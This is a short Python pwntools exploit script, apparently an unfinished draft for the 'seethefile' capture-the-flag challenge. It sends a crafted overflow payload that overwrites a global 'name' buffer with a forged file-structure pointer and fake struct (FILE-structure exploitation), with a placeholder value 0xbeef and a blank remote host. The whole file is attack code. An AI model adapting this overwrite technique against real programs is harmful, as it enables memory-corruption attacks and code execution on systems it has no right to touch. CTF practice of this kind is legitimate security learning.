from pwn import *

e = ELF("./seethefile")
libc = ELF("./libc_32.so.6")

if "--remote" in sys.argv:
  p = remote("", 0)
else:
  p = process(["./ld-linux-32.so", e.path], env={"LD_PRELOAD": libc.path})

p.sendlineafter(":", "1")
p.sendlineafter(":", "a.txt")
gdb.attach(p)
p.sendlineafter(":", "5")

offset = e.symbols["name"] + 0x24
p.sendlineafter(":", "A" * 0x20 + p32(offset) + "\x00" * 0xd8 + p32(offset + 0xd8 + 4) + p32(0) * 17 + p32(0xbeef) + p32(0) * 3)


p.interactive()
